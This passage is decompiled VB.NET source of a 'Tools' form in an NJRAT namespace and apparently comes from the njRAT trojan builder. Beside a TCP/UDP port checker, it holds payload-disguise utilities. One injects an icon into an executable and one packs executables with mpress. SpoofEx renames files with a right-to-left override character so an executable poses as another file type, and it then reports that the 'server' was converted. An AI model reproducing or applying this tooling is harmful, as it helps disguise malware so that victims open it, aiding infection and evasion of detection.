Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports InjectIcon
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001C RID: 28
	<DesignerGenerated()>
	Public Partial Class Tools
		Inherits Form

		' Token: 0x060003A8 RID: 936 RVA: 0x0001FB58 File Offset: 0x0001DD58
		Public Sub New()
			AddHandler MyBase.FormClosed, AddressOf Me.Port_Teste_FormClosed
			AddHandler MyBase.FormClosing, AddressOf Me.Port_Teste_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Port_Teste_Load
			Tools.__ENCAddToList(Me)
			Me.ico = New OpenFileDialog()
			Me.exe = New OpenFileDialog()
			Me.cc = New OpenFileDialog()
			Me.OpenFileDialog = New OpenFileDialog()
			Me.InitializeComponent()
		End Sub

		' Token: 0x060003A9 RID: 937 RVA: 0x0001FBDC File Offset: 0x0001DDDC
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Tools.__ENCList
			SyncLock _ENCList
				If Tools.__ENCList.Count = Tools.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Tools.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Tools.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Tools.__ENCList(num) = Tools.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Tools.__ENCList.RemoveRange(num, Tools.__ENCList.Count - num)
					Tools.__ENCList.Capacity = Tools.__ENCList.Count
				End If
				Tools.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700014B RID: 331
		' (get) Token: 0x060003AC RID: 940 RVA: 0x00021680 File Offset: 0x0001F880
		' (set) Token: 0x060003AD RID: 941 RVA: 0x00021698 File Offset: 0x0001F898
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700014C RID: 332
		' (get) Token: 0x060003AE RID: 942 RVA: 0x000216F0 File Offset: 0x0001F8F0
		' (set) Token: 0x060003AF RID: 943 RVA: 0x00003137 File Offset: 0x00001337
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700014D RID: 333
		' (get) Token: 0x060003B0 RID: 944 RVA: 0x00021708 File Offset: 0x0001F908
		' (set) Token: 0x060003B1 RID: 945 RVA: 0x00003140 File Offset: 0x00001340
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Me._Button2 = value
			End Set
		End Property

		' Token: 0x1700014E RID: 334
		' (get) Token: 0x060003B2 RID: 946 RVA: 0x00021720 File Offset: 0x0001F920
		' (set) Token: 0x060003B3 RID: 947 RVA: 0x00003149 File Offset: 0x00001349
		Friend Overridable Property TextBox2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox2 = value
			End Set
		End Property

		' Token: 0x1700014F RID: 335
		' (get) Token: 0x060003B4 RID: 948 RVA: 0x00021738 File Offset: 0x0001F938
		' (set) Token: 0x060003B5 RID: 949 RVA: 0x00003152 File Offset: 0x00001352
		Friend Overridable Property NumericUpDown1 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._NumericUpDown1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._NumericUpDown1 = value
			End Set
		End Property

		' Token: 0x17000150 RID: 336
		' (get) Token: 0x060003B6 RID: 950 RVA: 0x00021750 File Offset: 0x0001F950
		' (set) Token: 0x060003B7 RID: 951 RVA: 0x0000315B File Offset: 0x0000135B
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000151 RID: 337
		' (get) Token: 0x060003B8 RID: 952 RVA: 0x00021768 File Offset: 0x0001F968
		' (set) Token: 0x060003B9 RID: 953 RVA: 0x00003164 File Offset: 0x00001364
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000152 RID: 338
		' (get) Token: 0x060003BA RID: 954 RVA: 0x00021780 File Offset: 0x0001F980
		' (set) Token: 0x060003BB RID: 955 RVA: 0x0000316D File Offset: 0x0000136D
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x17000153 RID: 339
		' (get) Token: 0x060003BC RID: 956 RVA: 0x00021798 File Offset: 0x0001F998
		' (set) Token: 0x060003BD RID: 957 RVA: 0x00003176 File Offset: 0x00001376
		Friend Overridable Property RadioButton1 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton1 = value
			End Set
		End Property

		' Token: 0x17000154 RID: 340
		' (get) Token: 0x060003BE RID: 958 RVA: 0x000217B0 File Offset: 0x0001F9B0
		' (set) Token: 0x060003BF RID: 959 RVA: 0x0000317F File Offset: 0x0000137F
		Friend Overridable Property RadioButton2 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton2 = value
			End Set
		End Property

		' Token: 0x17000155 RID: 341
		' (get) Token: 0x060003C0 RID: 960 RVA: 0x000217C8 File Offset: 0x0001F9C8
		' (set) Token: 0x060003C1 RID: 961 RVA: 0x00003188 File Offset: 0x00001388
		Friend Overridable Property RadioButton3 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton3 = value
			End Set
		End Property

		' Token: 0x17000156 RID: 342
		' (get) Token: 0x060003C2 RID: 962 RVA: 0x000217E0 File Offset: 0x0001F9E0
		' (set) Token: 0x060003C3 RID: 963 RVA: 0x00003191 File Offset: 0x00001391
		Friend Overridable Property GroupBox3 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox3 = value
			End Set
		End Property

		' Token: 0x17000157 RID: 343
		' (get) Token: 0x060003C4 RID: 964 RVA: 0x000217F8 File Offset: 0x0001F9F8
		' (set) Token: 0x060003C5 RID: 965 RVA: 0x0000319A File Offset: 0x0000139A
		Friend Overridable Property GroupBox2 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox2 = value
			End Set
		End Property

		' Token: 0x17000158 RID: 344
		' (get) Token: 0x060003C6 RID: 966 RVA: 0x00021810 File Offset: 0x0001FA10
		' (set) Token: 0x060003C7 RID: 967 RVA: 0x00021828 File Offset: 0x0001FA28
		Friend Overridable Property RadioButton5 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Dim value2 As EventHandler = AddressOf Me.RadioButton5_CheckedChanged
				If Me._RadioButton5 IsNot Nothing Then
					RemoveHandler Me._RadioButton5.CheckedChanged, value2
				End If
				Me._RadioButton5 = value
				If Me._RadioButton5 IsNot Nothing Then
					AddHandler Me._RadioButton5.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000159 RID: 345
		' (get) Token: 0x060003C8 RID: 968 RVA: 0x00021880 File Offset: 0x0001FA80
		' (set) Token: 0x060003C9 RID: 969 RVA: 0x000031A3 File Offset: 0x000013A3
		Friend Overridable Property PictureBox2 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox2 = value
			End Set
		End Property

		' Token: 0x1700015A RID: 346
		' (get) Token: 0x060003CA RID: 970 RVA: 0x00021898 File Offset: 0x0001FA98
		' (set) Token: 0x060003CB RID: 971 RVA: 0x000031AC File Offset: 0x000013AC
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x1700015B RID: 347
		' (get) Token: 0x060003CC RID: 972 RVA: 0x000218B0 File Offset: 0x0001FAB0
		' (set) Token: 0x060003CD RID: 973 RVA: 0x000031B5 File Offset: 0x000013B5
		Friend Overridable Property PictureBox3 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox3 = value
			End Set
		End Property

		' Token: 0x1700015C RID: 348
		' (get) Token: 0x060003CE RID: 974 RVA: 0x000218C8 File Offset: 0x0001FAC8
		' (set) Token: 0x060003CF RID: 975 RVA: 0x000031BE File Offset: 0x000013BE
		Friend Overridable Property GroupBox4 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox4 = value
			End Set
		End Property

		' Token: 0x1700015D RID: 349
		' (get) Token: 0x060003D0 RID: 976 RVA: 0x000218E0 File Offset: 0x0001FAE0
		' (set) Token: 0x060003D1 RID: 977 RVA: 0x000031C7 File Offset: 0x000013C7
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x1700015E RID: 350
		' (get) Token: 0x060003D2 RID: 978 RVA: 0x000218F8 File Offset: 0x0001FAF8
		' (set) Token: 0x060003D3 RID: 979 RVA: 0x00021910 File Offset: 0x0001FB10
		Friend Overridable Property Button3 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button3_Click
				If Me._Button3 IsNot Nothing Then
					RemoveHandler Me._Button3.Click, value2
				End If
				Me._Button3 = value
				If Me._Button3 IsNot Nothing Then
					AddHandler Me._Button3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700015F RID: 351
		' (get) Token: 0x060003D4 RID: 980 RVA: 0x00021968 File Offset: 0x0001FB68
		' (set) Token: 0x060003D5 RID: 981 RVA: 0x00021980 File Offset: 0x0001FB80
		Friend Overridable Property Button4 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button4_Click
				If Me._Button4 IsNot Nothing Then
					RemoveHandler Me._Button4.Click, value2
				End If
				Me._Button4 = value
				If Me._Button4 IsNot Nothing Then
					AddHandler Me._Button4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000160 RID: 352
		' (get) Token: 0x060003D6 RID: 982 RVA: 0x000219D8 File Offset: 0x0001FBD8
		' (set) Token: 0x060003D7 RID: 983 RVA: 0x000219F0 File Offset: 0x0001FBF0
		Friend Overridable Property Button5 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button5_Click
				If Me._Button5 IsNot Nothing Then
					RemoveHandler Me._Button5.Click, value2
				End If
				Me._Button5 = value
				If Me._Button5 IsNot Nothing Then
					AddHandler Me._Button5.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000161 RID: 353
		' (get) Token: 0x060003D8 RID: 984 RVA: 0x00021A48 File Offset: 0x0001FC48
		' (set) Token: 0x060003D9 RID: 985 RVA: 0x000031D0 File Offset: 0x000013D0
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x17000162 RID: 354
		' (get) Token: 0x060003DA RID: 986 RVA: 0x00021A60 File Offset: 0x0001FC60
		' (set) Token: 0x060003DB RID: 987 RVA: 0x000031D9 File Offset: 0x000013D9
		Friend Overridable Property TextBox4 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox4 = value
			End Set
		End Property

		' Token: 0x17000163 RID: 355
		' (get) Token: 0x060003DC RID: 988 RVA: 0x00021A78 File Offset: 0x0001FC78
		' (set) Token: 0x060003DD RID: 989 RVA: 0x000031E2 File Offset: 0x000013E2
		Friend Overridable Property GroupBox5 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox5 = value
			End Set
		End Property

		' Token: 0x17000164 RID: 356
		' (get) Token: 0x060003DE RID: 990 RVA: 0x00021A90 File Offset: 0x0001FC90
		' (set) Token: 0x060003DF RID: 991 RVA: 0x000031EB File Offset: 0x000013EB
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x17000165 RID: 357
		' (get) Token: 0x060003E0 RID: 992 RVA: 0x00021AA8 File Offset: 0x0001FCA8
		' (set) Token: 0x060003E1 RID: 993 RVA: 0x00021AC0 File Offset: 0x0001FCC0
		Friend Overridable Property Button6 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button6_Click
				If Me._Button6 IsNot Nothing Then
					RemoveHandler Me._Button6.Click, value2
				End If
				Me._Button6 = value
				If Me._Button6 IsNot Nothing Then
					AddHandler Me._Button6.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000166 RID: 358
		' (get) Token: 0x060003E2 RID: 994 RVA: 0x00021B18 File Offset: 0x0001FD18
		' (set) Token: 0x060003E3 RID: 995 RVA: 0x00021B30 File Offset: 0x0001FD30
		Friend Overridable Property Button8 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button8_Click
				If Me._Button8 IsNot Nothing Then
					RemoveHandler Me._Button8.Click, value2
				End If
				Me._Button8 = value
				If Me._Button8 IsNot Nothing Then
					AddHandler Me._Button8.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000167 RID: 359
		' (get) Token: 0x060003E4 RID: 996 RVA: 0x00021B88 File Offset: 0x0001FD88
		' (set) Token: 0x060003E5 RID: 997 RVA: 0x000031F4 File Offset: 0x000013F4
		Friend Overridable Property TextBox6 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox6 = value
			End Set
		End Property

		' Token: 0x17000168 RID: 360
		' (get) Token: 0x060003E6 RID: 998 RVA: 0x00021BA0 File Offset: 0x0001FDA0
		' (set) Token: 0x060003E7 RID: 999 RVA: 0x000031FD File Offset: 0x000013FD
		Friend Overridable Property GroupBox6 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox6 = value
			End Set
		End Property

		' Token: 0x17000169 RID: 361
		' (get) Token: 0x060003E8 RID: 1000 RVA: 0x00021BB8 File Offset: 0x0001FDB8
		' (set) Token: 0x060003E9 RID: 1001 RVA: 0x00003206 File Offset: 0x00001406
		Friend Overridable Property Label5 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label5 = value
			End Set
		End Property

		' Token: 0x1700016A RID: 362
		' (get) Token: 0x060003EA RID: 1002 RVA: 0x00021BD0 File Offset: 0x0001FDD0
		' (set) Token: 0x060003EB RID: 1003 RVA: 0x0000320F File Offset: 0x0000140F
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x1700016B RID: 363
		' (get) Token: 0x060003EC RID: 1004 RVA: 0x00021BE8 File Offset: 0x0001FDE8
		' (set) Token: 0x060003ED RID: 1005 RVA: 0x00021C00 File Offset: 0x0001FE00
		Friend Overridable Property Button7 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button7_Click
				If Me._Button7 IsNot Nothing Then
					RemoveHandler Me._Button7.Click, value2
				End If
				Me._Button7 = value
				If Me._Button7 IsNot Nothing Then
					AddHandler Me._Button7.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016C RID: 364
		' (get) Token: 0x060003EE RID: 1006 RVA: 0x00021C58 File Offset: 0x0001FE58
		' (set) Token: 0x060003EF RID: 1007 RVA: 0x00003218 File Offset: 0x00001418
		Friend Overridable Property TextBox5 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox5 = value
			End Set
		End Property

		' Token: 0x1700016D RID: 365
		' (get) Token: 0x060003F0 RID: 1008 RVA: 0x00021C70 File Offset: 0x0001FE70
		' (set) Token: 0x060003F1 RID: 1009 RVA: 0x00021C88 File Offset: 0x0001FE88
		Friend Overridable Property Button9 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button9_Click
				If Me._Button9 IsNot Nothing Then
					RemoveHandler Me._Button9.Click, value2
				End If
				Me._Button9 = value
				If Me._Button9 IsNot Nothing Then
					AddHandler Me._Button9.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016E RID: 366
		' (get) Token: 0x060003F2 RID: 1010 RVA: 0x00021CE0 File Offset: 0x0001FEE0
		' (set) Token: 0x060003F3 RID: 1011 RVA: 0x00003221 File Offset: 0x00001421
		Friend Overridable Property Label6 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label6 = value
			End Set
		End Property

		' Token: 0x060003F4 RID: 1012 RVA: 0x00021CF8 File Offset: 0x0001FEF8
		Private Sub Port_Teste_FormClosed(sender As Object, e As FormClosedEventArgs)
			Try
			Catch ex As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x060003F5 RID: 1013 RVA: 0x00021CF8 File Offset: 0x0001FEF8
		Private Sub Port_Teste_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
			Catch ex As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x060003F6 RID: 1014 RVA: 0x00021D38 File Offset: 0x0001FF38
		Private Sub Port_Teste_Load(sender As Object, e As EventArgs)
			Try
				Me.PictureBox2.BackColor = Color.Black
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003F7 RID: 1015 RVA: 0x00021D84 File Offset: 0x0001FF84
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.TextBox1.Clear()
			If Me.RadioButton2.Checked Then
				Try
					Dim text As String = Me.TextBox2.Text
					Dim portNumber As Integer = Convert.ToInt32(Me.NumericUpDown1.Value)
					If Me.PortTCP(text, portNumber) Then
						Me.TextBox1.Text = "Port Open"
						Me.PictureBox2.BackColor = Color.Black
						Me.PictureBox2.Image = Me.PictureBox3.Image
					Else
						Me.TextBox1.Text = "Port Closed"
						Me.PictureBox2.BackColor = Color.Black
						Me.PictureBox2.Image = Me.PictureBox4.Image
					End If
				Catch ex As Exception
					Interaction.MsgBox("Erro !", MsgBoxStyle.Information, Nothing)
				End Try
			End If
			If Me.RadioButton1.Checked Then
				Try
					Dim text2 As String = Me.TextBox2.Text
					Dim portNumber2 As Integer = Convert.ToInt32(Me.NumericUpDown1.Value)
					If Me.PortUDP(text2, portNumber2) Then
						Me.TextBox1.Text = "Port Open"
						Me.PictureBox2.BackColor = Color.Black
						Me.PictureBox2.Image = Me.PictureBox3.Image
					Else
						Me.TextBox1.Text = "Port Closed"
						Me.PictureBox2.BackColor = Color.Black
						Me.PictureBox2.Image = Me.PictureBox4.Image
					End If
				Catch ex2 As Exception
					Interaction.MsgBox("Erro !", MsgBoxStyle.Information, Nothing)
				End Try
			End If
		End Sub

		' Token: 0x060003F8 RID: 1016 RVA: 0x0000322A File Offset: 0x0000142A
		Private Sub RadioButton5_CheckedChanged(sender As Object, e As EventArgs)
			If Me.RadioButton5.Checked Then
				Me.TextBox2.Clear()
			End If
		End Sub

		' Token: 0x060003F9 RID: 1017 RVA: 0x00021F5C File Offset: 0x0002015C
		Private Function PortTCP(Host As String, PortNumber As Integer) As Boolean
			Dim tcpClient As TcpClient = Nothing
			Dim result As Boolean
			Try
				tcpClient = New TcpClient(Host, PortNumber)
				result = True
			Catch ex As SocketException
				result = False
			Finally
				If tcpClient IsNot Nothing Then
					tcpClient.Close()
				End If
			End Try
			Return result
		End Function

		' Token: 0x060003FA RID: 1018 RVA: 0x00021FB4 File Offset: 0x000201B4
		Private Function PortUDP(Host As String, PortNumber As Integer) As Boolean
			Dim udpClient As UdpClient = Nothing
			Dim result As Boolean
			Try
				udpClient = New UdpClient(Host, PortNumber)
				result = True
			Catch ex As SocketException
				result = False
			Finally
				If udpClient IsNot Nothing Then
					udpClient.Close()
				End If
			End Try
			Return result
		End Function

		' Token: 0x060003FB RID: 1019 RVA: 0x00002A6F File Offset: 0x00000C6F
		Private Sub Button2_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060003FC RID: 1020 RVA: 0x0002200C File Offset: 0x0002020C
		Private Sub Button5_Click(sender As Object, e As EventArgs)
			Me.ico.Filter = "Ico|*.ico"
			Me.ico.Title = "Ico"
			Me.ico.ShowDialog()
			Me.TextBox1.Text = Me.ico.FileName
		End Sub

		' Token: 0x060003FD RID: 1021 RVA: 0x0002205C File Offset: 0x0002025C
		Private Sub Button4_Click(sender As Object, e As EventArgs)
			Me.exe.Filter = "Exe|*.exe"
			Me.exe.Title = "Exe File"
			Me.exe.ShowDialog()
			Me.TextBox2.Text = Me.exe.FileName
		End Sub

		' Token: 0x060003FE RID: 1022 RVA: 0x000220AC File Offset: 0x000202AC
		Private Sub Button3_Click(sender As Object, e As EventArgs)
			Try
				IconInjector.InjectIcon(Me.exe.FileName, Me.ico.FileName)
				Interaction.MsgBox("Done", MsgBoxStyle.Information, Nothing)
			Catch ex As Exception
				Interaction.MsgBox("Error", MsgBoxStyle.Critical, Nothing)
			End Try
		End Sub

		' Token: 0x060003FF RID: 1023 RVA: 0x00022114 File Offset: 0x00020314
		Private Sub Button8_Click(sender As Object, e As EventArgs)
			Me.cc.Filter = "Exe|*.exe"
			Me.cc.Title = "Exe File"
			Me.cc.ShowDialog()
			Me.TextBox6.Text = Me.cc.FileName
		End Sub

		' Token: 0x06000400 RID: 1024 RVA: 0x00022164 File Offset: 0x00020364
		Private Sub Button6_Click(sender As Object, e As EventArgs)
			Dim str As String = " " + Me.cc.FileName
			Dim str2 As String = "stubs\mpress.exe"
			Interaction.Shell(str2 + str, AppWinStyle.MinimizedFocus, False, -1)
		End Sub

		' Token: 0x06000401 RID: 1025 RVA: 0x000221A0 File Offset: 0x000203A0
		Public Sub SpoofEx(File_Sp As String, Extension As String)
			Dim array As Char() = Extension.ToCharArray()
			Array.Reverse(array)
			Dim destFileName As String = File_Sp.Substring(0, File_Sp.Length - 4) + "‮" + New String(array) + File_Sp.Substring(File_Sp.Length - 4)
			File.Move(File_Sp, destFileName)
		End Sub

		' Token: 0x06000402 RID: 1026 RVA: 0x000221F0 File Offset: 0x000203F0
		Private Sub Button9_Click(sender As Object, e As EventArgs)
			Dim openFileDialog As OpenFileDialog = Me.OpenFileDialog
			openFileDialog.Title = "Choose file ..."
			openFileDialog.Filter = "All Files (*.*)|*.*"
			openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
			If openFileDialog.ShowDialog() = DialogResult.OK Then
				Me.TextBox1.Text = Me.OpenFileDialog.FileName
			End If
		End Sub

		' Token: 0x06000403 RID: 1027 RVA: 0x00003244 File Offset: 0x00001444
		Private Sub Button7_Click(sender As Object, e As EventArgs)
			Me.SpoofEx(Me.OpenFileDialog.FileName, Me.ComboBox1.Text)
			Interaction.MsgBox(" your server convert  successfully", MsgBoxStyle.Information, "convert ")
			Me.Close()
		End Sub

		' Token: 0x040001B7 RID: 439
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001B9 RID: 441
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040001BA RID: 442
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x040001BB RID: 443
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x040001BC RID: 444
		<AccessedThroughProperty("TextBox2")>
		Private _TextBox2 As TextBox

		' Token: 0x040001BD RID: 445
		<AccessedThroughProperty("NumericUpDown1")>
		Private _NumericUpDown1 As NumericUpDown

		' Token: 0x040001BE RID: 446
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x040001BF RID: 447
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x040001C0 RID: 448
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x040001C1 RID: 449
		<AccessedThroughProperty("RadioButton1")>
		Private _RadioButton1 As RadioButton

		' Token: 0x040001C2 RID: 450
		<AccessedThroughProperty("RadioButton2")>
		Private _RadioButton2 As RadioButton

		' Token: 0x040001C3 RID: 451
		<AccessedThroughProperty("RadioButton3")>
		Private _RadioButton3 As RadioButton

		' Token: 0x040001C4 RID: 452
		<AccessedThroughProperty("GroupBox3")>
		Private _GroupBox3 As GroupBox

		' Token: 0x040001C5 RID: 453
		<AccessedThroughProperty("GroupBox2")>
		Private _GroupBox2 As GroupBox

		' Token: 0x040001C6 RID: 454
		<AccessedThroughProperty("RadioButton5")>
		Private _RadioButton5 As RadioButton

		' Token: 0x040001C7 RID: 455
		<AccessedThroughProperty("PictureBox2")>
